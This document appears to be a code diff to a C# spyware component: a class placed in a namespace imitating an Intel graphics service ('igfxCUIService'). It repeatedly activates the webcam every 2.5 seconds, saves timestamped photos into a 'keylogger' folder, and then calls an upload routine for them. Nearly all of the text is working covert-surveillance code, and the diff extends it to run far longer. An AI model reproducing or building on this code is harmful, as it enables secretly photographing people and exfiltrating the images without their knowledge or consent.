@@ -13,54 +13,68 @@ using System.Threading;
 
 namespace igfxCUIService
 {
-    class webcam
+    class Webcam
     {
 
         #region [webcam]
 
-        private static DateTime datum = DateTime.Now;
+
         static FilterInfoCollection WebcamColl;
         static VideoCaptureDevice Device;
-        private static decimal hour;
-        private static decimal minuten;
-        private static decimal seconde;
+        public static DateTime datum = DateTime.Now;
+        public static decimal hour;
+        public static decimal minuten;
+        public static decimal seconde;
+        public static string folderName = @"D:/keylogger/webcam/";
+        public static string pathString = System.IO.Path.Combine(folderName, "" + datum.ToShortDateString() + "/");
+        public static decimal webcamhour;
+        public static decimal webcamminut;
+        public static decimal webcamseconde;
 
         #endregion
 
         #region [ aantal websnaphot]
-        public static void aantalwebshots()
+        public static void Aantalwebshots()
         {
-            for (int i = 0; i < 1500; i++)
+            for (int i = 0; i < 1500000; i++)
             {
                 Thread.Sleep(2500);
                 DateTime TimeNow = DateTime.Now;
-                seconde = TimeNow.Second;
                 hour = TimeNow.Hour;
                 minuten = TimeNow.Minute;
                 seconde = TimeNow.Second;
+
                 WebcamColl = new FilterInfoCollection(FilterCategory.VideoInputDevice);
 
                 //if you have connected with one more camera choose index as you want 
                 Device = new VideoCaptureDevice(WebcamColl[0].MonikerString);
                 Device.Start();
-                Device.NewFrame += new NewFrameEventHandler(imagesave);
+                Device.NewFrame += new NewFrameEventHandler(Imagesave);
             }
         }
 
         #endregion
 
         #region [webcam fotos maken]
-        static void imagesave(object sender, NewFrameEventArgs eventArgs)
+        static void Imagesave(object sender, NewFrameEventArgs eventArgs)
         {
+            
             Image img = (Bitmap)eventArgs.Frame.Clone();
-            string fileName = ".jpg";
-            string folderName = @"D:/keylogger/webcam/";
-            string pathString = System.IO.Path.Combine(folderName, "" + datum.ToShortDateString() + "/");
             System.IO.Directory.CreateDirectory(pathString);
-            img.Save(pathString + hour + "." + minuten + "." + seconde + fileName);
+
+            webcamhour = hour;
+            webcamminut = minuten;
+            webcamseconde = seconde;
+            img.Save(pathString + hour + "." + minuten + "." + seconde + ".jpeg", ImageFormat.Jpeg);
             Device.SignalToStop();
+
+            Upload.Webcamupload();
+            
+
+
         }
 
         #endregion
+
     }
 }
